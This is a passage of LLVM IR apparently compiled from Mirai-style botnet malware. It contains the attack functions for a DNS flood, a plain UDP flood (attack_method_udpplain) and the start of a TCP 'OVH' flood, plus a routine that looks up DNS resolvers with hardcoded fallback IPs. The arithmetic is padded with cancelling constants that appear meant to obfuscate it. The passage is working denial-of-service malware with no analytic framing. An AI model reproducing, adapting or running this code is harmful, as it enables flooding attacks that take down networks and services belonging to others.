  %411 = xor i32 %409, %410
  %412 = and i32 %411, %409
  %413 = and i32 %409, 65535
  %414 = trunc i32 %412 to i16
  %415 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %416 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %415, i32 0, i32 0
  store i16 %414, i16* %416, align 2
  br label %417

; <label>:417:                                    ; preds = %408, %404
  %418 = load i8*, i8** %36, align 8
  %419 = load i8, i8* %19, align 1
  %420 = zext i8 %419 to i32
  call void @rand_alpha_str(i8* %418, i32 %420)
  %421 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 0, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %424 = bitcast %struct.iphdr* %423 to i16*
  %425 = call zeroext i16 @checksum_generic(i16* %424, i32 20)
  %426 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 7
  store i16 %425, i16* %427, align 2
  %428 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 3
  store i16 0, i16* %429, align 2
  %430 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %431 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %432 = bitcast %struct.udphdr* %431 to i8*
  %433 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %434 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %433, i32 0, i32 2
  %435 = load i16, i16* %434, align 2
  %436 = load i8, i8* %19, align 1
  %437 = zext i8 %436 to i64
  %438 = sub i64 21, 6732043682803493400
  %439 = add i64 %438, %437
  %440 = add i64 %439, 6732043682803493400
  %441 = add i64 21, %437
  %442 = add i64 %440, 4443567646994198216
  %443 = add i64 %442, 2
  %444 = sub i64 %443, 4443567646994198216
  %445 = add i64 %440, 2
  %446 = load i32, i32* %21, align 4
  %447 = sext i32 %446 to i64
  %448 = sub i64 0, %447
  %449 = sub i64 %444, %448
  %450 = add i64 %444, %447
  %451 = sub i64 0, 4
  %452 = sub i64 %449, %451
  %453 = add i64 %449, 4
  %454 = trunc i64 %452 to i32
  %455 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %430, i8* %432, i16 zeroext %435, i32 %454)
  %456 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %457 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %456, i32 0, i32 3
  store i16 %455, i16* %457, align 2
  %458 = load i32, i32* %22, align 4
  %459 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %460 = load i32, i32* %9, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %463, i32 0, i32 2
  %465 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %464, i32 0, i32 0
  store i32 %458, i32* %465, align 4
  %466 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %467 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %466, i32 0, i32 1
  %468 = load i16, i16* %467, align 2
  %469 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %470 = load i32, i32* %9, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %469, i64 %471
  %473 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %472, i32 0, i32 0
  %474 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %473, i32 0, i32 1
  store i16 %468, i16* %474, align 2
  %475 = load i32, i32* %10, align 4
  %476 = load i8*, i8** %32, align 8
  %477 = load i8, i8* %19, align 1
  %478 = zext i8 %477 to i64
  %479 = sub i64 41, 6096776872205198059
  %480 = add i64 %479, %478
  %481 = add i64 %480, 6096776872205198059
  %482 = add i64 41, %478
  %483 = sub i64 %481, -8466322070146927728
  %484 = add i64 %483, 2
  %485 = add i64 %484, -8466322070146927728
  %486 = add i64 %481, 2
  %487 = load i32, i32* %21, align 4
  %488 = sext i32 %487 to i64
  %489 = sub i64 0, %485
  %490 = sub i64 0, %488
  %491 = add i64 %489, %490
  %492 = sub i64 0, %491
  %493 = add i64 %485, %488
  %494 = sub i64 0, 4
  %495 = sub i64 %492, %494
  %496 = add i64 %492, 4
  %497 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %498 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %499 = load i32, i32* %9, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %498, i64 %500
  %502 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %501, i32 0, i32 0
  %503 = bitcast %struct.sockaddr_in* %502 to %struct.sockaddr*
  store %struct.sockaddr* %503, %struct.sockaddr** %497, align 8
  %504 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %505 = load %struct.sockaddr*, %struct.sockaddr** %504, align 8
  %506 = call i64 @sendto(i32 %475, i8* %476, i64 %495, i32 16384, %struct.sockaddr* %505, i32 16)
  br label %507

; <label>:507:                                    ; preds = %417
  %508 = load i32, i32* %9, align 4
  %509 = sub i32 %508, -396271314
  %510 = add i32 %509, 1
  %511 = add i32 %510, -396271314
  %512 = add nsw i32 %508, 1
  store i32 %511, i32* %9, align 4
  br label %343

; <label>:513:                                    ; preds = %343
  br label %342

; <label>:514:                                    ; preds = %92, %86, %80
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 21, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 21)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %105

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 22)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 22, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 22)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %104

; <label>:28:                                     ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %92, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %97

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %92

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %71, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %71, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 0, 1
  %68 = add i32 %66, %67
  %69 = sub nsw i32 %66, 1
  %70 = icmp eq i32 %65, %68
  br i1 %70, label %71, label %91

; <label>:71:                                     ; preds = %64, %60, %56
  %72 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %74 = load i32, i32* %4, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %73, i64 %75
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = add i32 %77, 1546453663
  %80 = sub i32 %79, %78
  %81 = sub i32 %80, 1546453663
  %82 = sub nsw i32 %77, %78
  call void @util_memcpy(i8* %72, i8* %76, i32 %81)
  %83 = load i32, i32* %6, align 4
  %84 = load i32, i32* %4, align 4
  %85 = add i32 %83, 950622468
  %86 = sub i32 %85, %84
  %87 = sub i32 %86, 950622468
  %88 = sub nsw i32 %83, %84
  %89 = sext i32 %87 to i64
  %90 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %89
  store i8 0, i8* %90, align 1
  store i8 1, i8* %9, align 1
  br label %97

; <label>:91:                                     ; preds = %64
  br label %92

; <label>:92:                                     ; preds = %91, %49
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 0, 1
  %95 = sub i32 %93, %94
  %96 = add nsw i32 %93, 1
  store i32 %95, i32* %6, align 4
  br label %30

; <label>:97:                                     ; preds = %71, %30
  %98 = load i8, i8* %9, align 1
  %99 = icmp ne i8 %98, 0
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %97
  %101 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %102 = call i32 @inet_addr(i8* %101) #6
  store i32 %102, i32* %1, align 4
  br label %116

; <label>:103:                                    ; preds = %97
  br label %104

; <label>:104:                                    ; preds = %103, %15
  br label %105

; <label>:105:                                    ; preds = %104, %0
  %106 = call i32 @rand_next()
  %107 = urem i32 %106, 4
  switch i32 %107, label %116 [
    i32 0, label %108
    i32 1, label %110
    i32 2, label %112
    i32 3, label %114
  ]

; <label>:108:                                    ; preds = %105
  %109 = call i32 @htonl(i32 134744072) #7
  store i32 %109, i32* %1, align 4
  br label %116

; <label>:110:                                    ; preds = %105
  %111 = call i32 @htonl(i32 1246898730) #7
  store i32 %111, i32* %1, align 4
  br label %116

; <label>:112:                                    ; preds = %105
  %113 = call i32 @htonl(i32 1074151430) #7
  store i32 %113, i32* %1, align 4
  br label %116

; <label>:114:                                    ; preds = %105
  %115 = call i32 @htonl(i32 67240450) #7
  store i32 %115, i32* %1, align 4
  br label %116

; <label>:116:                                    ; preds = %114, %112, %110, %108, %105, %100
  %117 = load i32, i32* %1, align 4
  ret i32 %117
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %173, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %180

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %154

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, 1335875684
  %143 = add i32 %142, %141
  %144 = sub i32 %143, 1335875684
  %145 = add i32 %132, %141
  %146 = call i32 @htonl(i32 %144) #7
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %125, %116
  %155 = load i32*, i32** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %161 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 0
  %166 = bitcast %struct.sockaddr_in* %165 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %160, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @connect(i32 %159, %struct.sockaddr* %168, i32 16)
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %154
  br label %172

; <label>:172:                                    ; preds = %171, %154
  br label %173

; <label>:173:                                    ; preds = %172
  %174 = load i32, i32* %9, align 4
  %175 = sub i32 0, %174
  %176 = sub i32 0, 1
  %177 = add i32 %175, %176
  %178 = sub i32 0, %177
  %179 = add nsw i32 %174, 1
  store i32 %178, i32* %9, align 4
  br label %58

; <label>:180:                                    ; preds = %58
  br label %181

; <label>:181:                                    ; preds = %216, %180
  store i32 0, i32* %9, align 4
  br label %182

; <label>:182:                                    ; preds = %209, %181
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  br i1 %186, label %187, label %216

; <label>:187:                                    ; preds = %182
  %188 = load i8**, i8*** %10, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8*, i8** %188, i64 %190
  %192 = load i8*, i8** %191, align 8
  store i8* %192, i8** %22, align 8
  %193 = load i8, i8* %15, align 1
  %194 = icmp ne i8 %193, 0
  br i1 %194, label %195, label %199

; <label>:195:                                    ; preds = %187
  %196 = load i8*, i8** %22, align 8
  %197 = load i16, i16* %14, align 2
  %198 = zext i16 %197 to i32
  call void @rand_str(i8* %196, i32 %198)
  br label %199

; <label>:199:                                    ; preds = %195, %187
  %200 = load i32*, i32** %11, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds i32, i32* %200, i64 %202
  %204 = load i32, i32* %203, align 4
  %205 = load i8*, i8** %22, align 8
  %206 = load i16, i16* %14, align 2
  %207 = zext i16 %206 to i64
  %208 = call i64 @send(i32 %204, i8* %205, i64 %207, i32 16384)
  br label %209

; <label>:209:                                    ; preds = %199
  %210 = load i32, i32* %9, align 4
  %211 = sub i32 0, %210
  %212 = sub i32 0, 1
  %213 = add i32 %211, %212
  %214 = sub i32 0, %213
  %215 = add nsw i32 %210, 1
  store i32 %214, i32* %9, align 4
  br label %182

; <label>:216:                                    ; preds = %182
  br label %181
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_ovh(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 0)
  %87 = trunc i32 %86 to i8
